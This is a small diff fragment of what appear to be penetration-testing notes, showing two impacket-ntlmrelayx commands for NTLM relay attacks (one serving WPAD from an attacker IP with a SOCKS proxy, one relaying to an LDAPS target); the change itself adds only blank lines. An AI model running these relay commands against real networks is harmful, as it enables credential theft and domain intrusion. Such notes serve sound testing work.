@@ -28,3 +28,5 @@ impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug
 # -t is the target where you want to relay to. 
 impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
 ```
+
+
